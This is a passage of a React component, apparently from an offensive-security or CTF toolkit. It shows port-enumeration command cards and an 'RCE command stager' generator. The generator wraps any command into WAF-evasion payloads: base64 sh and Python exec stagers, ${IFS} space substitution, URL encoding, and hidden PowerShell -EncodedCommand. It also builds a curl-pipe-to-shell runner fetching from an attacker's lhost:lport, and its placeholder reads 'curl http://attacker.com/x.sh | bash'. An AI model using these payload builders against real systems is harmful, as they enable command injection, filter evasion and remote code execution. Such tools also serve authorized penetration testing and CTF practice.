                    className="p-3 bg-cyber-darker border border-cyber-border rounded-lg flex items-start justify-between gap-3 hover:border-cyber-cyan/50 transition-colors"
                  >
                    <div className="space-y-1 flex-1">
                      <div className="flex items-center gap-2">
                        <span className="bg-black/60 px-2 py-0.5 rounded text-cyber-cyan font-bold text-xs border border-cyber-border">
                          Port {portItem.port}
                        </span>
                        <span className="text-white font-bold text-xs">{portItem.service}</span>
                        <span className="text-gray-500 text-[11px]">({portItem.tool})</span>
                      </div>
                      <pre className="text-gray-300 select-all text-xs overflow-x-auto whitespace-pre-wrap bg-black/50 p-2 rounded border border-cyber-border/60">
                        {portItem.cmd}
                      </pre>
                    </div>
                    <button
                      onClick={() => handleCopy(portItem.cmd, `port_${portItem.port}`)}
                      className="p-1.5 rounded hover:bg-white/10 text-gray-400 hover:text-white shrink-0 mt-1"
                      title="Copy Command"
                    >
                      {copiedId === `port_${portItem.port}` ? <Check className="w-4 h-4 text-cyber-cyan" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                ))}
            </div>
          </div>
        </div>
      )}

      {/* RCE COMMAND STAGERS */}
      {category === 'stager' && (
        <div className="space-y-4 font-mono text-xs">
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
            <span className="text-emerald-400 font-bold uppercase tracking-wider block text-sm">
              [WEB] Arbitrary Command Stager & WAF Filter Bypass
            </span>
            <p className="text-gray-400 text-[11px]">
              Transforms any raw bash/sh/windows command into obfuscated or evasion payloads for command injection (?cmd=).
            </p>
            <div>
              <label className="text-gray-400 block mb-1 text-[11px] font-bold">Input Raw Command:</label>
              <input
                type="text"
                value={customCmd}
                onChange={(e) => setCustomCmd(e.target.value)}
                placeholder="e.g. cat /flag.txt or curl http://attacker.com/x.sh | bash"
                className="w-full bg-cyber-darker border border-cyber-border rounded-lg px-3 py-2 text-white focus:outline-none focus:border-emerald-500"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              {
                id: 'stg_b64_sh',
                title: 'Linux Base64 sh Wrapper',
                desc: 'sh -c "$(echo <b64> | base64 -d)"',
                code: `sh -c "$(echo ${safeB64(customCmd)} | base64 -d)"`
              },
              {
                id: 'stg_py_b64',
                title: 'Python3 Base64 Exec Stager',
                desc: 'Bypasses shell keyword and character filtering',
                code: `python3 -c "import base64;exec(base64.b64decode('${safeB64(customCmd)}'))"`
              },
              {
                id: 'stg_ifs',
                title: '${IFS} Space Filter Bypass',
                desc: 'Substitutes whitespace with Internal Field Separator',
                code: customCmd.replace(/ /g, '${IFS}')
              },
              {
                id: 'stg_url',
                title: 'Full URL-Encoded Injection',
                desc: 'Encodes every special character for GET/POST parameters',
                code: encodeURIComponent(customCmd)
              },
              {
                id: 'stg_ps',
                title: 'PowerShell -EncodedCommand',
                desc: 'Windows UTF-16LE Base64 execution bypass',
                code: `powershell -nop -w hidden -EncodedCommand ${toUtf16LeBase64(customCmd)}`
              },
              {
                id: 'stg_curl_pipe',
                title: 'Remote Script In-Memory Runner',
                desc: 'Executes remotely hosted payload without disk writes',
                code: `curl -s http://${lhost}:${lport}/payload.sh | ${shell}`
              }
            ].map((stg) => (
              <div key={stg.id} className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2 hover:border-emerald-500/40 transition-colors">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-white">{stg.title}</span>
                  <button
                    onClick={() => handleCopy(stg.code, stg.id)}
                    className="p-1.5 text-gray-400 hover:text-white flex items-center gap-1 text-[11px]"
                  >
                    {copiedId === stg.id ? <Check className="w-3.5 h-3.5 text-cyber-green" /> : <Copy className="w-3.5 h-3.5" />}
                    {copiedId === stg.id ? 'Copied' : 'Copy'}
                  </button>
                </div>
                <p className="text-[11px] text-gray-400">{stg.desc}</p>
                <pre className="bg-black/70 border border-cyber-border rounded p-2.5 text-cyber-green select-all break-all whitespace-pre-wrap text-[11px]">
                  {stg.code}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
